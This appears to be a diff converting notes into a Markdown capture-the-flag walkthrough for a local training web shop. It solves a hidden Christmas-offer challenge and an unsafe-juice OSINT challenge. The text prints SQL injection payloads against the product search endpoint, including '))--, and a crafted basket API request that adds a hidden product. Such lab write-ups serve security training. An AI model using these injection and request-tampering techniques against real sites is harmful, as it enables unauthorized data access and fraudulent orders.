@@ -1,310 +1,401 @@
-Notes: Order the Christmas Special Offer of 2014 & Unsafe Product Investigation
-Objective 1: Order the Christmas Special Offer of 2014
-Step 1: Inspect Product Search Requests
-Open:
-http://localhost:3000/#/search
+# Order the Christmas Special Offer of 2014
 
-Press F5 and monitor the Network tab in DevTools.
-Identify the request:
-GET /rest/products/search?q=
+## 1. Inspect Product Search Requests
 
+1. Open:
 
-Observation
+   ```
+   http://localhost:3000/#/search
+   ```
 
-The application retrieves product data through a single request during page load.
-The search field appears to filter already-loaded data rather than performing server-side searches.
-Screenshot Placeholder
+2. Press **F5** and monitor the **Network** tab in DevTools.
 
-[SCREENSHOT: Network tab showing GET /rest/products/search?q=]
+3. Identify the request:
 
-Step 2: Verify Search Endpoint Behavior
+   ```
+   GET /rest/products/search?q=
+   ```
 
-Test the endpoint directly:
+### Observation
 
+- Product data is retrieved through a single request during page load.
+- The search bar appears to filter data already loaded on the client side.
+- The `q=` parameter appears unnecessary and may be a leftover from an earlier implementation.
+
+### Screenshot
+
+![Network tab showing GET /rest/products/search?q=](screenshots/network-search-request.png)
+
+---
+
+## 2. Verify Search Endpoint
+
+Call the endpoint directly:
+
+```http
 http://localhost:3000/rest/products/search?q=orange
-
+```
 
 Expected result:
 
-JSON response containing products matching "orange".
-Screenshot Placeholder
+```json
+[
+  {
+    "name": "Orange Juice",
+    ...
+  }
+]
+```
 
-[SCREENSHOT: JSON search results for "orange"]
+### Screenshot
 
-Step 3: Test for SQL Injection
+![JSON search results for orange](screenshots/search-orange-results.png)
 
-Attempt:
+---
 
+## 3. Test for SQL Injection
+
+Submit:
+
+```http
 http://localhost:3000/rest/products/search?q=';
-
+```
 
 Expected result:
 
-Error page containing:
+```text
 SQLITE_ERROR: syntax error
+```
 
+This confirms that SQL injection is possible.
 
-This confirms SQL injection is possible.
+### Screenshot
 
-Screenshot Placeholder
+![SQLITE_ERROR syntax error](screenshots/sqlite-syntax-error.png)
 
-[SCREENSHOT: SQLITE_ERROR syntax error]
+---
 
-Step 4: Bypass Query Logic
+## 4. Retrieve Deleted Products
 
 Testing:
 
+```sql
 '--
+```
 
+produces:
 
-Results in:
-
+```text
 SQLITE_ERROR: incomplete input
+```
 
-
-Reason:
-
-Unbalanced parentheses remain in the query.
+because the query contains unbalanced parentheses.
 
 Use:
 
+```sql
 '))--
+```
 
+Request:
+
+```http
+http://localhost:3000/rest/products/search?q='))--
+```
 
 Expected result:
 
-Full product list returned.
-Includes logically deleted products.
-Locate:
+- Full product list is returned.
+- Logically deleted products become visible.
+- Identify:
+
+```text
 Christmas Super-Surprise-Box (2014 Edition)
+```
 
+Record:
 
-Record its:
-
+```text
 ProductId = 10
+```
 
-Screenshot Placeholder
+### Screenshot
 
-[SCREENSHOT: JSON output showing ProductId 10 and Christmas Super-Surprise-Box]
+![Christmas special product in JSON response](screenshots/christmas-product-id10.png)
 
-Step 5: Add Product to Basket
+---
 
-Navigate to:
+## 5. Obtain Basket ID
 
-http://localhost:3000/#/login
+1. Open:
 
+   ```
+   http://localhost:3000/#/login
+   ```
 
-Log in with any user account.
+2. Log in with any valid account.
 
-Add any standard product to the basket.
+3. Add a normal product to the basket.
 
-Determine your basket ID:
+4. Obtain the Basket ID:
+   - From a basket-related request in the Network tab, or
+   - From Session Storage (`bid` value).
 
-From Network requests, or
-From Session Storage (bid variable).
-Screenshot Placeholder
+### Screenshot
 
-[SCREENSHOT: BasketId in Network tab or Session Storage]
+![Basket ID in Session Storage](screenshots/basket-id.png)
 
-Step 6: Insert Hidden Product
+---
+
+## 6. Add the Hidden Product
 
 Send:
 
+```http
 POST http://localhost:3000/api/BasketItems
 Content-Type: application/json
-
+```
 
 Body:
 
+```json
 {
-  "BasketId": "<Your Basket ID>",
+  "BasketId": "<YOUR_BASKET_ID>",
   "ProductId": 10,
   "quantity": 1
 }
+```
 
-Screenshot Placeholder
+### Screenshot
 
-[SCREENSHOT: POST request adding ProductId 10]
+![POST request adding hidden product](screenshots/add-product-10.png)
 
-Step 7: Verify Basket
+---
+
+## 7. Verify Basket Contents
 
 Open:
 
+```
 http://localhost:3000/#/basket
+```
 
+Confirm that:
 
-Verify:
-
+```text
 Christmas Super-Surprise-Box (2014 Edition)
+```
 
+is now present.
 
-appears in the basket.
+### Screenshot
 
-Screenshot Placeholder
+![Basket containing Christmas special](screenshots/basket-christmas-special.png)
 
-[SCREENSHOT: Basket containing Christmas Super-Surprise-Box]
+---
 
-Step 8: Complete Challenge
+## 8. Complete the Challenge
 
 Click:
 
+```text
 Checkout
-
+```
 
 Challenge solved.
 
-Screenshot Placeholder
+### Screenshot
 
-[SCREENSHOT: Challenge completion message]
+![Challenge solved notification](screenshots/challenge-completed.png)
 
-Alternative Method (Without SQL Injection)
-Retrieve Product List
+---
+
+# Alternative Solution (Without SQL Injection)
+
+## Retrieve Complete Product List
 
 Open:
 
+```http
 http://localhost:3000/rest/products/search?q=
+```
 
-Tasks
-Record all missing IDs from the otherwise sequential list.
-Add each missing product ID to the basket using:
+### Steps
+
+1. Review all returned product IDs.
+2. Identify missing IDs in the sequence.
+3. For each missing ID, send:
+
+```json
 {
-  "BasketId": "<Your Basket ID>",
-  "ProductId": "<Missing ID>",
+  "BasketId": "<YOUR_BASKET_ID>",
+  "ProductId": "<MISSING_ID>",
   "quantity": 1
 }
+```
 
-Repeat until:
-Christmas Super-Surprise-Box (2014 Edition)
+4. Check the basket after each addition.
+5. When the **Christmas Super-Surprise-Box (2014 Edition)** appears, proceed to checkout.
 
+---
 
-appears.
+# Identify an Unsafe Product
 
-Checkout to complete the challenge.
-Objective 2: Identify an Unsafe Product
-Step 1: Locate Deleted Products
+## 1. Enumerate Deleted Products
 
-Use either method from the previous challenge to enumerate deleted products.
+Continue reviewing deleted products until you find:
 
-Continue until finding:
-
+```text
 Rippertuer Special Juice
+```
 
-Screenshot Placeholder
+### Screenshot
 
-[SCREENSHOT: Rippertuer Special Juice product details]
+![Rippertuer Special Juice product page](screenshots/rippertuer-special-juice.png)
 
-Step 2: Analyze Product Description
+---
 
-Notice the warning:
+## 2. Review Product Description
 
+Warning displayed:
+
+```text
 This item has been made unavailable because of lack of safety standards.
+```
 
+Visible ingredients:
 
-Partial ingredients shown:
+- Cherymoya (*Annona cherimola*)
+- Jabuticaba (*Myrciaria cauliflora*)
+- Bael (*Aegle marmelos*)
+- Others...
 
-Cherymoya (Annona cherimola)
-Jabuticaba (Myrciaria cauliflora)
-Bael (Aegle marmelos)
-Others...
+### Screenshot
 
-Submitting these ingredients will not solve the challenge.
+![Unsafe product description](screenshots/unsafe-product-description.png)
 
-Step 3: Research Ingredient Source
+---
 
-Search:
+## 3. Research the Ingredients
 
+Search for:
+
+```text
 Cherymoya Annona cherimola Jabuticaba Myrciaria cauliflora Bael Aegle marmelos
+```
 
+Find:
 
-Locate:
-
+```text
 Top 20 Fruits You Probably Don't Know
+```
 
+In the comments section, locate a reference to:
 
-Read the comments and find a post referencing:
-
+```text
 Rippertuer Special Juice
+```
 
+along with a Pastebin link.
 
-with a Pastebin link.
+### Screenshot
 
-Screenshot Placeholder
+![Blog comment referencing Rippertuer Special Juice](screenshots/blog-comment-reference.png)
 
-[SCREENSHOT: Blog comment referencing Rippertuer Special Juice]
+---
 
-Step 4: Review Pastebin Ingredients
+## 4. Review the Ingredient List
 
 Open the referenced Pastebin entry:
 
+```text
 Rippertuer Special Juice Ingredients
+```
 
+Examine the JSON document containing fruit descriptions.
 
-Review the JSON ingredient list.
+### Screenshot
 
-Screenshot Placeholder
+![Pastebin ingredient list](screenshots/pastebin-ingredients.png)
 
-[SCREENSHOT: Ingredient JSON document]
+---
 
-Step 5: Identify Dangerous Combination
+## 5. Identify the Dangerous Combination
 
-Carefully inspect descriptions.
+One entry mentions:
 
-Find the warning for:
-
+```text
 Hueteroneel
+```
 
+with the warning:
 
-which mentions:
-
+```text
 this coupled with Eurogium Edule was sometimes found fatal
+```
 
+Since **Eurogium Edule** is also present in the ingredient list, these are the hazardous ingredients.
 
-Since:
+### Dangerous Ingredients
 
-Eurogium Edule
+- `Hueteroneel`
+- `Eurogium Edule`
 
+### Screenshot
 
-also appears in the ingredient list, these are the dangerous ingredients.
+![Ingredient warning identifying dangerous combination](screenshots/dangerous-ingredients.png)
 
-Answer
+---
 
-Eurogium Edule
-Hueteroneel
-Step 6: Submit Report
+## 6. Submit the Report
 
 Open:
 
+```
 http://localhost:3000/#/contact
+```
 
+Submit a comment containing:
 
-Submit a message containing:
-
+```text
 Eurogium Edule
 Hueteroneel
-
+```
 
 Challenge solved.
 
-Screenshot Placeholder
+### Screenshot
 
-[SCREENSHOT: Submitted contact form]
+![Submitted contact form](screenshots/contact-form-submission.png)
 
-Screenshot Placeholder
+### Screenshot
 
-[SCREENSHOT: Challenge completion confirmation]
+![Challenge solved confirmation](screenshots/final-challenge-success.png)
 
-Key Findings
-Hidden Product
-Item	ValueProduct	Christmas Super-Surprise-Box (2014 Edition)
-Product ID	10
-Unsafe Juice Ingredients
-Ingredient	RiskHueteroneel	Dangerous when combined
-Eurogium Edule	Dangerous when combined
-Techniques Used
-Network traffic inspection
-API analysis
-Hidden resource enumeration
-SQL injection discovery
-Basket manipulation through API requests
-Open-source intelligence (OSINT)
-Data correlation from public sources and product metadata
+---
+
+# Summary
+
+## Christmas Special Offer
+
+```text
+Product: Christmas Super-Surprise-Box (2014 Edition)
+Product ID: 10
+```
+
+## Unsafe Juice Ingredients
+
+```text
+Hueteroneel
+Eurogium Edule
+```
+
+## Techniques Used
+
+- Network traffic analysis
+- API enumeration
+- SQL injection discovery
+- Hidden product retrieval
+- Basket API manipulation
+- Open Source Intelligence (OSINT)
+- Ingredient correlation and hazard
